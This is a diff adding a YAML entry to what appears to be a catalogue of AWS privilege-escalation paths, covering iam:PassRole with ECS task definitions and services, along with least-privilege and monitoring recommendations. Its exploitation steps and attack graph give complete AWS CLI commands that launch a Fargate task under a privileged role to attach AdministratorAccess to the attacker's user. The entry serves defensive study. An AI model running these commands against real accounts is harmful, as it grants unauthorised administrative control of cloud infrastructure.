@@ -1,0 +1,236 @@
+id: ecs-003
+name: iam:PassRole + ecs:RegisterTaskDefinition + ecs:CreateService
+category: service-passrole
+services:
+- iam
+- ecs
+description: A principal with `iam:PassRole`, `ecs:RegisterTaskDefinition`, and `ecs:CreateService` can create an ECS task definition with a privileged IAM role and launch it as a Fargate service. When the task runs, it executes with the permissions of the passed role. The level of access gained depends on the permissions of the available roles.
+prerequisites:
+  admin:
+  - An ECS cluster must exist in the account
+  - A role must exist that trusts ecs-tasks.amazonaws.com to assume it
+  - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
+  lateral:
+  - An ECS cluster must exist in the account
+  - A role must exist that trusts ecs-tasks.amazonaws.com to assume it
+exploitationSteps:
+  awscli:
+  - step: 1
+    command: aws sts get-caller-identity
+    description: Get your account ID for constructing resource ARNs
+  - step: 2
+    command: aws ecs list-clusters
+    description: List available ECS clusters in the account
+  - step: 3
+    command: |
+      aws ec2 describe-vpcs --filters "Name=isDefault,Values=true"
+      aws ec2 describe-subnets --filters "Name=vpc-id,Values=VPC_ID"
+    description: Get the default VPC ID and subnet IDs for Fargate network configuration
+  - step: 4
+    command: |
+      aws ecs register-task-definition \
+        --family privesc-task \
+        --network-mode awsvpc \
+        --requires-compatibilities FARGATE \
+        --cpu 256 \
+        --memory 512 \
+        --task-role-arn "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE" \
+        --execution-role-arn "arn:aws:iam::ACCOUNT_ID:role/ecsTaskExecutionRole" \
+        --container-definitions '[{
+          "name": "privesc-container",
+          "image": "public.ecr.aws/amazonlinux/amazonlinux:latest",
+          "command": ["sh", "-c", "aws sts get-caller-identity; aws iam attach-user-policy --user-name STARTING_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"],
+          "essential": true,
+          "logConfiguration": {
+            "logDriver": "awslogs",
+            "options": {
+              "awslogs-group": "/ecs/privesc-task",
+              "awslogs-region": "us-east-1",
+              "awslogs-stream-prefix": "ecs"
+            }
+          }
+        }]'
+    description: Register a task definition with the privileged role and container that executes commands to escalate privileges
+  - step: 5
+    command: |
+      aws ecs create-service \
+        --cluster CLUSTER_NAME \
+        --service-name privesc-service \
+        --task-definition privesc-task \
+        --launch-type FARGATE \
+        --desired-count 1 \
+        --network-configuration "awsvpcConfiguration={subnets=[SUBNET_ID],securityGroups=[SG_ID],assignPublicIp=ENABLED}"
+    description: Create an ECS service that launches the task on Fargate
+  - step: 6
+    command: |
+      aws ecs list-tasks --cluster CLUSTER_NAME --service-name privesc-service
+      aws ecs describe-tasks --cluster CLUSTER_NAME --tasks TASK_ARN
+    description: Monitor the task status until it completes execution
+  - step: 7
+    command: aws sts get-caller-identity
+    description: Verify that your permissions have been escalated (if the task modified your principal)
+recommendation: |
+  Restrict the `iam:PassRole` permission using the principle of least privilege.
+
+  Use IAM policy conditions to restrict which roles can be passed and to which services:
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:PassRole",
+    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificECSTaskRole",
+    "Condition": {
+      "StringEquals": {
+        "iam:PassedToService": "ecs-tasks.amazonaws.com"
+      }
+    }
+  }
+  ```
+
+  Additionally, restrict ECS task and service operations:
+  - Limit `ecs:RegisterTaskDefinition` to specific task families or require approval workflows
+  - Restrict `ecs:CreateService` to specific clusters or task definitions
+  - Monitor CloudTrail for RegisterTaskDefinition followed by CreateService or RunTask
+  - Use ECS service-level IAM permissions to control who can create services
+  - Implement VPC security groups and network policies to limit container network access
+limitations: |
+  This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks or data exfiltration from the container environment.
+discoveredBy:
+  name: Unknown
+  organization: Unknown
+relatedPaths:
+- ec2-001
+- lambda-001
+- ecs-001
+- ecs-002
+learningEnvironments:
+  pathfinder-labs:
+    type: open-source
+    githubLink: https://github.com/DataDog/pathfinder-labs
+    scenario: iam-passrole+ecs-registertaskdefinition+ecs-createservice
+    description: "Deploy Terraform scenarios individually or in groups, each with attack and cleanup scripts"
+attackVisualization:
+  nodes:
+  - id: start
+    label: starting-principal
+    type: principal
+    description: |
+      The principal with iam:PassRole, ecs:RegisterTaskDefinition, and ecs:CreateService permissions. Can be an IAM user or role. Unlike ecs-001, this path assumes an ECS cluster already exists.
+  - id: task_definition
+    label: ECS Task Definition
+    type: resource
+    description: |
+      The registered ECS task definition with the target role passed via iam:PassRole. Includes a container with commands to execute when the task runs.
+  - id: ecs_service
+    label: ECS Service
+    type: resource
+    description: |
+      An ECS service created on an existing cluster that launches the task. The service maintains the task until completion.
+  - id: target_role
+    label: target-role
+    type: resource
+    description: |
+      The IAM role passed to the task definition. Must trust ecs-tasks.amazonaws.com. The task automatically assumes this role when it runs.
+  - id: admin_outcome
+    label: Effective Administrator
+    type: outcome
+    description: |
+      If the target role has administrative permissions, the attacker gains full administrative access by having the task attach admin policies to the starting principal.
+  - id: partial_outcome
+    label: Check for Additional Access
+    type: outcome
+    color: '#ffeb99'
+    description: |
+      If the target role has elevated but non-administrative permissions, the attacker gains partial privilege escalation with possible access to sensitive data or additional escalation paths.
+  - id: minimal_outcome
+    label: No Additional Access
+    type: outcome
+    color: '#cccccc'
+    description: |
+      If the target role has minimal permissions, the privilege escalation may not provide meaningful additional access.
+  edges:
+  - from: start
+    to: task_definition
+    label: iam:PassRole + ecs:RegisterTaskDefinition
+    description: |
+      The attacker registers a task definition that passes a privileged role.
+
+      Command:
+      ```bash
+      aws ecs register-task-definition \
+        --family privesc-task \
+        --task-role-arn "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE" \
+        --network-mode awsvpc \
+        --requires-compatibilities FARGATE \
+        --cpu 256 --memory 512 \
+        --container-definitions '[{"name":"exploit","image":"amazon/aws-cli:latest","command":["iam","attach-user-policy","--user-name","STARTING_USER","--policy-arn","arn:aws:iam::aws:policy/AdministratorAccess"]}]'
+      ```
+  - from: task_definition
+    to: ecs_service
+    label: ecs:CreateService
+    description: |
+      The attacker creates a service on an existing ECS cluster.
+
+      Command:
+      ```bash
+      aws ecs create-service \
+        --cluster existing-cluster \
+        --service-name privesc-service \
+        --task-definition privesc-task \
+        --desired-count 1 \
+        --launch-type FARGATE \
+        --network-configuration "awsvpcConfiguration={subnets=[SUBNET_ID],assignPublicIp=ENABLED}"
+      ```
+  - from: ecs_service
+    to: target_role
+    label: Service launches task with role
+    description: |
+      The ECS service launches the task which automatically assumes the target role and executes the containerized commands with the role's permissions.
+  - from: target_role
+    to: admin_outcome
+    label: If role has admin permissions
+    branch: A
+    condition: admin
+    description: |
+      If the target role has AdministratorAccess or equivalent, the task successfully escalates the starting principal to full administrative access.
+  - from: target_role
+    to: partial_outcome
+    label: If role has some permissions
+    branch: B
+    condition: some_permissions
+    description: |
+      If the target role has elevated but non-administrative permissions, the task performs limited privilege escalation.
+  - from: target_role
+    to: minimal_outcome
+    label: If role has minimal permissions
+    branch: C
+    condition: no_permissions
+    description: |
+      If the target role has minimal permissions, the task may not yield meaningful privilege escalation.
+permissions:
+  required:
+  - permission: iam:PassRole
+    resourceConstraints: Target role ARN must be in the Resource section
+  - permission: ecs:RegisterTaskDefinition
+    resourceConstraints: Must have permission to register ECS task definitions
+  - permission: ecs:CreateService
+    resourceConstraints: Must have permission to create ECS services
+  additional:
+  - permission: ec2:DescribeVpcs
+    resourceConstraints: Helpful for finding the default VPC for network configuration
+  - permission: ec2:DescribeSubnets
+    resourceConstraints: Helpful for finding subnets for Fargate network configuration
+  - permission: ecs:DescribeClusters
+    resourceConstraints: Useful for discovering available ECS clusters and their configurations
+  - permission: ecs:ListClusters
+    resourceConstraints: Helpful for listing all available clusters in the account
+  - permission: ecs:DescribeServices
+    resourceConstraints: Useful for monitoring service creation and status
+  - permission: ecs:DescribeTasks
+    resourceConstraints: Helpful for monitoring task execution and completion
+  - permission: ecs:ListTasks
+    resourceConstraints: Useful for listing tasks in the service to monitor execution
+  - permission: iam:ListRoles
+    resourceConstraints: Helpful for discovering available roles to pass
+  - permission: iam:GetRole
+    resourceConstraints: Useful for viewing role trust policies and attached permissions
